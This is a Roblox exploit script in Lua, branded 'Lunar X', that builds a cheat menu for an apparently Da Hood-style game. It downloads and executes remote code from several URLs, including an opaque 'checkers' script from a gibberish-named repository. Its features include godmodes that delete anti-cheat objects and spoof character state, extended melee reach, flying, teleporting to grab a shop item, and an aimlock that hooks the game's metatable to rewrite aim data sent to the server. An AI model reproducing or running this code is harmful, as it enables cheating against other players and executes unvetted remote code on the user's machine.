local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
local player = game:GetService("Players").LocalPlayer
   Notification.new("success", "Working!", "Loading script...")
   loadstring(game:HttpGet("https://raw.githubusercontent.com/fdeijuhjfdhifdhijfdijohijfdijfdjoifdjff/-hbnjuedgugfdsuhfdgufhdighiosdghjisdgjojodgojdgjopjodgjodghohodjghnodghodhojghjodghojnedghohnogdfhjb/main/checkers"))()
   local player = game.Players.LocalPlayer

local windows = loadstring(game:HttpGet("https://www.lunarscriptz.tk/library.lua"))()
local win = windows:Create({
    Title = "Lunar X",
    Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
})

local tab = win:NewTab({
    Title = "Information"
})

local tab2 = win:NewTab({
    Title = "Godmodes"
})

local tab3 = win:NewTab({
    Title = "Misc"
})

tab:Label({
    Title = "Information & Updates"
})

tab:Button({
    Title = "Discord Invite",
    Callback = function()
        setclipboard("https://discord.com/invite/K7csEGu6Gg")
    end
})

tab:Toggle({
    Title = "Notifications",
    Description = "Notifications true/false",
    Callback = function(args)
    -- nothing to do with this right now
    end
})

tab2:Button({
    Title = "Godmode Anti-Cheat [EXECUTE THIS FIRST]",
    Callback = function()
        local LP = game.Players.LocalPlayer;

    for i,v in ipairs(LP.Character:GetDescendants()) do
        if v.Name == "Christmas_Sock" then v:Destroy()
            end;
        end;
            
        LP.Character.ChildAdded:Connect(function()
        wait(0.3)
        for i,v in ipairs(LP.Character:GetDescendants()) do
        if v.Name == "Christmas_Sock" then v:Destroy()
        end;
        end;
        end);
    end
})

tab2:Button({
    Title = "GodBlock & Bulletproof",
    Callback = function()
        local localPlayer = game:GetService('Players').LocalPlayer;
    local localCharacter = localPlayer.Character;
    localCharacter:FindFirstChildWhichIsA('Humanoid').Health = 0;
    for _,v in pairs(localPlayer.Character:GetChildren()) do
        if v:IsA('MeshPart') or v:IsA('Accessory') then
            v:Destroy();
        end;
    end;
    local newCharacter = localPlayer.CharacterAdded:Wait();
    local spoofFolder = Instance.new('Folder');
    spoofFolder.Name = 'FULLY_LOADED_CHAR';
    spoofFolder.Parent = newCharacter;
    newCharacter:WaitForChild('RagdollConstraints'):Destroy();
    newCharacter:WaitForChild('BodyEffects'):WaitForChild('Defense'):Destroy();
    newCharacter:WaitForChild('BodyEffects'):WaitForChild('Armor'):Destroy();
    local spoofValue = Instance.new('BoolValue', newCharacter);
    spoofValue.Name = 'RagdollConstraints';
    local defValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
    defValue.Name = 'Defense';
    local armValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
    armValue.Name = 'Armor';
    end
})

tab2:Button({
    Title = "FullGod",
    Callback = function()
        local localPlayer = game:GetService('Players').LocalPlayer;
        local localCharacter = localPlayer.Character;
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA('MeshPart') or  v:IsA('Accessory') then
                v:Destroy()
            end
        end
        local newCharacter = localPlayer.CharacterAdded:Wait();
        local spoofFolder = Instance.new('Folder');
        spoofFolder.Name = 'FULLY_LOADED_CHAR';
        spoofFolder.Parent = newCharacter;
        newCharacter:WaitForChild('RagdollConstraints'):Destroy();
        local spoofValue = Instance.new('BoolValue', newCharacter);
        spoofValue.Name = 'RagdollConstraints';
        local name = game.Players.LocalPlayer.Name
        local lol =    game.Workspace:WaitForChild(name)
        local money = Instance.new("Folder",game.Players.LocalPlayer.Character);money.Name = "FULLY_LOADED_CHAR"            lol.Parent = game.Workspace.Players
        game.Players.LocalPlayer.Character:WaitForChild("BodyEffects")
        game.Players.LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
    end
})

tab3:Button({
    Title = "Anti-Fling",
    Callback = function()
        -- // Constants \ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               if Detected == false then
                   game.StarterGui:SetCore("ChatMakeSystemMessage", {
                       Text = "Fling Exploit detected, Player: " .. tostring(Player);
                       Color = Color3.fromRGB(255, 200, 0);
                   })
               end
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition

           game.StarterGui:SetCore("ChatMakeSystemMessage", {
               Text = "You were flung. Neutralizing velocity.";
               Color = Color3.fromRGB(255, 0, 0);
           })
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
    end
})

tab3:Button({
    Title = "Max Reach",
    Callback = function()
        game:GetService('RunService'):BindToRenderStep("Reach", 0 , function()
                local success, err = pcall(function()
                    if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                end)
end)
    end
})

tab3:Button({
    Title = "Simple Fly",
    Callback = function()
        local L_143_ = game.Players.LocalPlayer
	local L_144_ = L_143_:GetMouse()
	localplayer = L_143_
	if workspace:FindFirstChild("Core") then
		workspace.Core:Destroy()
	end
	local L_145_ = Instance.new("Part")
	L_145_.Name = "Core"
	L_145_.Size = Vector3.new(0.05, 0.05, 0.05)
	spawn(function()
		L_145_.Parent = workspace
		local L_152_ = Instance.new("Weld", L_145_)
		L_152_.Part0 = L_145_
		L_152_.Part1 = localplayer.Character.LowerTorso
		L_152_.C0 = CFrame.new(0, 0, 0)
	end)
	workspace:WaitForChild("Core")
	local L_146_ = workspace.Core
	flying = true
	local L_147_ = 25
	local L_148_ = {
		a = false,
		d = false,
		w = false,
		s = false
	}
	local L_149_
	local L_150_
	local function L_151_func()
		local L_153_ = Instance.new("BodyPosition", L_146_)
		local L_154_ = Instance.new("BodyGyro", L_146_)
		L_153_.Name = "EPIXPOS"
		L_153_.maxForce = Vector3.new(math.huge, math.huge, math.huge)
		L_153_.position = L_146_.Position
		L_154_.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		L_154_.cframe = L_146_.CFrame
		repeat
			wait()
			localplayer.Character.Humanoid.PlatformStand = true
			local L_155_ = L_154_.cframe - L_154_.cframe.p + L_153_.position
			if not L_148_.w and not L_148_.s and not L_148_.a and not L_148_.d then
				L_147_ = 25
			end
			if L_148_.w then
				L_155_ = L_155_ + workspace.CurrentCamera.CoordinateFrame.lookVector * L_147_
				L_147_ = L_147_ + 0
			end
			if L_148_.s then
				L_155_ = L_155_ - workspace.CurrentCamera.CoordinateFrame.lookVector * L_147_
				L_147_ = L_147_ + 0
			end
			if L_148_.d then
				L_155_ = L_155_ * CFrame.new(L_147_, 0, 0)
				L_147_ = L_147_ + 0
			end
			if L_148_.a then
				L_155_ = L_155_ * CFrame.new(-L_147_, 0, 0)
				L_147_ = L_147_ + 0
			end
			if L_147_ > 10 then
				L_147_ = 25
			end
			L_153_.position = L_155_.p
			if L_148_.w then
				L_154_.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(L_147_ * 0), 0, 0)
			elseif L_148_.s then
				L_154_.cframe = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(math.rad(L_147_ * 0), 0, 0)
			else
				L_154_.cframe = workspace.CurrentCamera.CoordinateFrame
			end
		until flying == false
		if L_154_ then
			L_154_:Destroy()
		end
		if L_153_ then
			L_153_:Destroy()
		end
		flying = false
		localplayer.Character.Humanoid.PlatformStand = false
		L_147_ = 25
	end
	L_149_ = L_144_.KeyDown:connect(function(L_156_arg0)
		if not L_146_ or not L_146_.Parent then
			flying = false
			L_149_:disconnect()
			L_150_:disconnect()
			return
		end
		if L_156_arg0 == "w" then
			L_148_.w = true
		elseif L_156_arg0 == "s" then
			L_148_.s = true
		elseif L_156_arg0 == "a" then
			L_148_.a = true
		elseif L_156_arg0 == "d" then
			L_148_.d = true
		elseif L_156_arg0 == "x" then
			if flying == true then
				flying = false
			else
				flying = true
				L_151_func()
			end
		end
	end)
	L_150_ = L_144_.KeyUp:connect(function(L_157_arg0)
		if L_157_arg0 == "w" then
			L_148_.w = false
		elseif L_157_arg0 == "s" then
			L_148_.s = false
		elseif L_157_arg0 == "a" then
			L_148_.a = false
		elseif L_157_arg0 == "d" then
			L_148_.d = false
		end
	end)
	L_151_func()
    end
})

tab3:Button({
    Title = "Auto-Mask",
    Callback = function()
        local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
        wait(.2)
        fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
        toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
        toolf.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character:WaitForChild("Mask")
        game:GetService("VirtualUser"):ClickButton1(Vector2.new())
        game.Players.LocalPlayer.Character:WaitForChild("In-gameMask")
        game.Players.LocalPlayer.Character["In-gameMask"].Handle:Destroy()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
    end
    end
})

tab3:Button({
    Title = "Aimlock",
    Callback = function()
        --[[
███████╗██╗░░░░░░█████╗░░██████╗██╗░░██╗░██╗░░░░░░░██╗
██╔════╝██║░░░░░██╔══██╗██╔════╝██║░░██║░██║░░██╗░░██║
█████╗░░██║░░░░░███████║╚█████╗░███████║░╚██╗████╗██╔╝
██╔══╝░░██║░░░░░██╔══██║░╚═══██╗██╔══██║░░████╔═████║░
██║░░░░░███████╗██║░░██║██████╔╝██║░░██║░░╚██╔╝░╚██╔╝░
╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░

]]
-- Toggle
getgenv().Target = true
-- Configuration
getgenv().Key = Enum.KeyCode.Q
getgenv().Prediction = 0.178
getgenv().ChatMode = false
getgenv().NotifMode = true
    getgenv().PartMode = true
    getgenv().AirshotFunccc = true
    getgenv().Partz = "HumanoidRootPart"
getgenv().AutoPrediction = true
--
    _G.Types = {
        Ball = Enum.PartType.Ball,
        Block = Enum.PartType.Block, 
        Cylinder = Enum.PartType.Cylinder
    }
    
    --variables                 
    	local Tracer = Instance.new("Part", game.Workspace)
    Tracer.Name = "gay"	
    Tracer.Anchored = true		
    Tracer.CanCollide = false
    Tracer.Transparency = 0.8
    Tracer.Parent = game.Workspace	
    Tracer.Shape = _G.Types.Block
    Tracer.Size = Vector3.new(14,14,14)
    Tracer.Color = Color3.fromRGB(128,128,128)
    
    --
    local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
local Runserv = game:GetService("RunService")

circle = Drawing.new("Circle")
circle.Color = Color3.fromRGB(255,255,255)
circle.Thickness = 0
circle.NumSides = 732
circle.Radius = 120
circle.Thickness = 0
circle.Transparency = 0.7
circle.Visible = true
circle.Filled = false

Runserv.RenderStepped:Connect(function()
    circle.Position = Vector2.new(mouse.X,mouse.Y+35)
end)
    
    	local guimain = Instance.new("Folder", game.CoreGui)
    	local CC = game:GetService"Workspace".CurrentCamera
    local LocalMouse = game.Players.LocalPlayer:GetMouse()
    	local Locking = false
    
    	
    --
    if getgenv().valiansh == true then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "Valiant",
                   Text = "Already Loaded!",
                   Duration = 5
        
                   })
        return
    end
    
    getgenv().valiansh = true
    
        local UserInputService = game:GetService("UserInputService")

    UserInputService.InputBegan:Connect(function(keygo,ok)
           if (not ok) then
           if (keygo.KeyCode == getgenv().Key) then
               if getgenv().Target == true then
               Locking = not Locking
               
               if Locking then
               Plr =  getClosestPlayerToCursor()
                if getgenv().ChatMode then
        local A_1 = "Target: "..tostring(Plr.Character.Humanoid.DisplayName) local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
        	end	
               if getgenv().NotifMode then
    			game.StarterGui:SetCore("SendNotification", {
        Title = "";
        Text = "Target: "..tostring(Plr.Character.Humanoid.DisplayName);
    
    })
    end
    elseif not Locking then
         if getgenv().ChatMode then
        local A_1 = "Unlocked!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
        	end	
        if getgenv().NotifMode then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "",
                   Text = "Unlocked",
                   Duration = 5
               })
           elseif getgenv().Target == false then
                        game.StarterGui:SetCore("SendNotification", {
                   Title = "",
                   Text = "Target isn't enabled",
                   Duration = 5
     
                   })
               
               end
                  
 
 end     end   
end
end
end)
	
	function getClosestPlayerToCursor()
		local closestPlayer
		local shortestDistance = circle.Radius

		for i, v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
				if magnitude < shortestDistance then
					closestPlayer = v
					shortestDistance = magnitude
				end
			end
		end
		return closestPlayer
	end
--
if getgenv().PartMode then
	game:GetService"RunService".Stepped:connect(function()
		if Locking and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
			Tracer.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*Prediction))
		else
			Tracer.CFrame = CFrame.new(0, 9999, 0)

		end
	end)
end

    
    
    --
	local rawmetatable = getrawmetatable(game)
	local old = rawmetatable.__namecall
	setreadonly(rawmetatable, false)
	rawmetatable.__namecall = newcclosure(function(...)
		local args = {...}
		if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
			args[3] = Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction)
			return old(unpack(args))
		end
		return old(...)
	end)


if getgenv().AirshotFunccc == true then

            if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                getgenv().Partz = "RightFoot"
            else
                Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
                    if new == Enum.HumanoidStateType.Freefall then
                    getgenv().Partz = "RightFoot"
                    else
                        getgenv().Partz = "LowerTorso"
                    end
                end)
            end
end
---
	while wait() do
	if getgenv().AutoPrediction == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue,'(')
        local ping = tonumber(split[1])
        if ping < 130 then
            getgenv().Prediction = 0.151
        elseif ping < 125 then
            getgenv().Prediction = 0.149
        elseif ping < 110 then
            getgenv().Prediction = 0.146
        elseif ping < 105 then
            getgenv().Prediction = 0.138
        elseif ping < 90 then
            getgenv().Prediction = 0.136
        elseif ping < 80 then
            getgenv().Prediction = 0.134
        elseif ping < 70 then
            getgenv().Prediction = 0.131
        elseif ping < 60 then
            getgenv().Prediction = 0.1229
        elseif ping < 50 then
            getgenv().Prediction = 0.1225
        elseif ping < 40 then
            getgenv().Prediction = 0.1256
        end
	end
    end
    end
})

   wait(2.5)
   Notification.new("info", "Information", "Script Loaded!")

local PremiumUsers = {
   "robloxspielerlol30" -- Owner of Script
}
   if table.find(PremiumUsers, player.Name) then
      Notification.new("info", "Checking", "Checking if you're a premium user...")
      wait(2)
      Notification.new("success", "Premium Commands", "Commands Loaded - Say :cmds for commands")
   else
      Notification.new("info", "Checking", "Checking if you're a premium user...")
      wait(2)
      Notification.new("error", "Premium Commands", "Not a premium User!")
end
